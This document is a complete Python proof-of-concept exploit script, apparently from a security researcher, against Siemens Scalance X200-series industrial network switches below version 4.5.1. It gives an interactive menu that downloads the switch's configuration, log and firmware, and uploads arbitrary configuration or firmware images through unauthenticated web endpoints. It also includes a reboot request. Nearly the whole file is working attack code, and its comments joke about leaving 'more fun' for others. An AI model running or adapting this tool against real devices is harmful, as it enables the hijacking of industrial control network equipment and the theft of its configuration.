#! /usr/bin/env python
# File name scalance-pwn.py
# written by eireann.leverett@ioactive.co.uk
# This POC allows upload and download of config and firmware
# for Scalance X200-series versions < 4.5.1
# Note that there is much more fun to have with this device
# but we like to leave some fun behind for future generations ;)

import time, httplib, sys, socket, re, mimetypes

def post_multipart(host, selector, fields, files):
	"""
	Post fields and files to an http host as multipart/form-data.
	fields is a sequence of (name, value) elements for regular form fields.
	files is a sequence of (name, filename, value) elements for data to be uploaded as files
	Return the server's response page.
	"""
	content_type, body = encode_multipart_formdata(fields, files)
	h = httplib.HTTPConnection(host)
	headers = {
		'User-Agent': 'Finely Waxed Moustaches',
		'Content-Type': content_type,
		'Accept-Encoding': 'gzip, deflate'
		}
	res = h.request('POST', selector, body, headers)
	sys.exit()


def encode_multipart_formdata(fields, files):
    """
    fields is a sequence of (name, value) elements for regular form fields.
    files is a sequence of (name, filename, value) elements for data to be uploaded as files
    Return (content_type, body) ready for httplib.HTTP instance
    """
    BOUNDARY = '----------FinelyWaxedMoustaches_$'
    CRLF = '\r\n'
    L = []
    for (key, value) in fields:
        L.append('--' + BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"' % key)
        L.append('')
        L.append(value)
    for (key, filename, value) in files:
        L.append('--' + BOUNDARY)
        L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
        L.append('Content-Type: %s' % get_content_type(filename))
        L.append('')
        L.append(value)
    L.append('--' + BOUNDARY + '--')
    L.append('')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
    return content_type, body

def get_content_type(filename):
    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'

def is_ipv4(ip):
	try:
		socket.inet_aton(ip)
		return True
	except socket.error,e:
		return False

def FetchConfigFile(connection, params, headers):
	result = connection.request("GET","/fs/cfgFile.cfg", params, headers)
	return result

def FetchLogFile(connection, params, headers):
	result = connection.request("GET","/fs/logFileA.diag", params, headers)
	return result

def FetchFirmware(connection, params, headers):
	result = connection.request("GET","/fs/firmget", params, headers)
	return result

def UploadConfig(host, filename):
	try:
		f = open(filename, "rb")
		data = ""
		for line in f:
			data += line
		files = [("file","pwned.cfg",data)] 
		post_multipart(host, "/incoming/postcfg.html", [] , files)
	except IOError, e:
		print e
		sys.exit()

def UploadFirmware(host, filename):
	try:
		f = open(filename, "rb")
		data = ""
		for line in f:
			data += line
		files = [("file","pwned.cfg",data)]
		print "Please be patient it will be ~5 minutes until the switch reboots." 
		post_multipart(host, "/incoming/postimage.html", [] , files)
	except IOError, e:
		print e
	sys.exit()

def RebootSwitch(connection, params, headers):
	result = connection.request("POST","/doc/XRestarting.html", params, headers)
	return result

def parse_nonceA(response):
	x = re.search('value=\"[A-F0-9]*\"',response)
	try:
		nonceA = x.group(0)
		nonceA = nonceA.strip('value=\"')
		nonceA = nonceA.strip('\"')
		return nonceA
	except AttributeError,e:
		return ""

def fetch_nonce(conn):
	#Send an intitial request to get the nonce
	conn.request("GET", "")
	r1 = conn.getresponse()
	response = r1.read()
	return parse_nonceA(response)

def PrintMainMenu():
	print (30 * '-')
	print ("   M A I N - M E N U")
	print (30 * '-')
	print ("1. Download files")
	print ("2. Upload files")
	print (30 * '-')
	ans = raw_input("Select a number: ")
	return ans

def PrintDownloadMenu():
	print (30 * '-')
	print (" D o w n l o a d - m e n u ")
	print (30 * '-')
	print ("1. Configuration file")
	print ("2. Log file")
	print ("3. Firmware")
	print (30 * '-')
	reply = raw_input("Please select the number of the file to download: ")
	return reply

def PrintUploadMenu():
	print (30 * '-')
	print (" U p l o a d - m e n u ")
	print (30 * '-')
	print ("1. Configuration file")
	print ("2. Firmware")
	print (30 * '-')
	reply = raw_input("Please select the number of the file to upload: ")
	return reply

machine = raw_input("Please enter the IPv4 address of the switch: ")
if is_ipv4(machine):
	print "Thank you."
else:
	print "Please go read RFC 791 and then use a legitimate IPv4 address."
	sys.exit()
mode = PrintMainMenu()
conn = httplib.HTTPConnection(machine)
nonceA = fetch_nonce(conn)
headers = {'Host': machine,'User-Agent': 'Finely Waxed Moustaches','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive'}
params = ""
start = time.clock()
if mode == '1':
	sel = PrintDownloadMenu()
	if sel == '1':
		r = FetchConfigFile(conn, params, headers)
	elif sel == '2':
		r = FetchLogFile(conn, params, headers)
	elif sel == '3':
		r = FetchFirmware(conn, params, headers)
	else:
		print "Please choose a sensible input next time, exiting."
		sys.exit()
elif mode == '2':
	sel = PrintUploadMenu()
	if sel == '1':
		filename = raw_input("Please enter the filename you wish to upload: ")
		r = UploadConfig(machine,filename)
	elif sel == '2':
		filename = raw_input("Please enter the filename you wish to upload: ")
		r = UploadFirmware(machine,filename)
	else:
		print "Please choose a sensible input next time, exiting."
		sys.exit()
else:
	print "Please choose a sensible input next time, exiting."
	sys.exit()
r = conn.getresponse()
timeRes = (time.clock() - start)
print r.status, r.reason, timeRes
data = r.read()
if mode == '1':
	f = open('Scalance'+sel, 'w');
	f.write(data);
	f.close();
	print "The file has been saved as Scalance"+sel
conn.close()
